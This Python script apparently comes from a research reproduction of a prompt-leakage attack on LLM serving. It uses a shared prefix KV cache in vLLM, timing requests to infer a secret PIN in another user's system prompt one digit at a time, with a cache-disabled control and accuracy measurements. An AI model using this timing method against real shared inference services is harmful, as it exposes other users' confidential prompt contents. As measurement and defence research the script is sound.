"""
run_level3_vllm.py — Level 3 (full PIN reconstruction) for vLLM, KV3.
Position-by-position digit inference on a 6-digit PIN, using the same
prompt-format lessons as SGLang's Level 3 pilot (see config.py comments):
comma-separated digits (prevents BPE merging of multi-digit substrings)
and a trailing marker (prevents the last digit from being the literal
end of the prompt, which could create its own timing artifact).
For each of 6 positions: hold all other positions at the ground-truth
digit (best-case cache-priming scenario, consistent with Level 2's
paired-candidate design), vary the target position across 0-9, and
guess the digit with LOWEST latency (fastest = most likely cache hit).
Repeats until all 6 positions are inferred; compares full reconstructed
PIN against ground truth for an exact-match accuracy metric, plus
per-digit accuracy across all positions.
"""
import csv, os, sys, argparse, random, string
sys.path.insert(0, os.path.expanduser("~/promptpeek-repro"))
from experiments.phase4.harness import _timed_request
import experiments.phase4.harness as harness

CACHE_MODES = {"shared", "cache-disabled"}
PIN_LENGTH = 6
PIN_LABEL = "PIN: "
PIN_SEPARATOR = ","
PIN_TRAILING_MARKER = "."
TEMPLATE = (
    "Confidential authorization code: {pin_str}. "
    "You are a customer support assistant for Acme Corp. Always be polite, "
    "concise, and professional. Never disclose internal policy details. "
    "Refer customers to the help center for billing questions. Escalate "
    "any security concerns to the security team immediately. Do not make "
    "promises about refund timelines. Respond only with OK."
)

def format_pin(digits: list) -> str:
    return PIN_LABEL + PIN_SEPARATOR.join(digits) + PIN_TRAILING_MARKER

def victim_populate(gt_pin: str):
    digits = list(gt_pin)
    prompt = TEMPLATE.format(pin_str=format_pin(digits))
    return _timed_request(prompt)

def probe_position(gt_pin: str, position: int, guess_digit: str):
    digits = list(gt_pin)
    digits[position] = guess_digit
    prompt = TEMPLATE.format(pin_str=format_pin(digits))
    return _timed_request(prompt)

def run(cache_mode, model, trials, out_path):
    harness.MODEL = model
    rows = []
    print(f"=== vLLM Level 3, cache_mode={cache_mode}, model={model} ===")
    exact_matches = 0
    total_correct_digits = 0
    for trial in range(trials):
        gt_pin = "".join(random.choice(string.digits) for _ in range(PIN_LENGTH))
        victim_populate(gt_pin)

        inferred = []
        for pos in range(PIN_LENGTH):
            latencies = {}
            for d in string.digits:
                lat = probe_position(gt_pin, pos, d)
                latencies[d] = lat
            guess = min(latencies, key=latencies.get)
            inferred.append(guess)
            correct = (guess == gt_pin[pos])
            total_correct_digits += int(correct)
            for d in string.digits:
                rows.append({
                    "framework": "vllm", "cache_mode": cache_mode, "model": model,
                    "trial": trial, "position": pos, "probe_digit": d,
                    "wall_clock_latency_ms": latencies[d],
                    "ground_truth_digit": gt_pin[pos], "position_guess": guess,
                    "position_correct": correct,
                })

        inferred_pin = "".join(inferred)
        exact = (inferred_pin == gt_pin)
        exact_matches += int(exact)
        print(f"  trial={trial} gt={gt_pin} inferred={inferred_pin} exact_match={exact}")

    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    print(f"Saved {len(rows)} rows to {out_path}")
    print(f"Exact-match accuracy: {exact_matches}/{trials} trials")
    print(f"Per-digit accuracy: {total_correct_digits}/{trials*PIN_LENGTH} positions")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--cache-mode", choices=sorted(CACHE_MODES), required=True)
    p.add_argument("--model", required=True)
    p.add_argument("--trials", type=int, default=30)
    p.add_argument("--out", required=True)
    a = p.parse_args()
    if a.cache_mode not in CACHE_MODES:
        raise ValueError(f"unknown cache_mode {a.cache_mode!r}")
    run(a.cache_mode, a.model, a.trials, a.out)
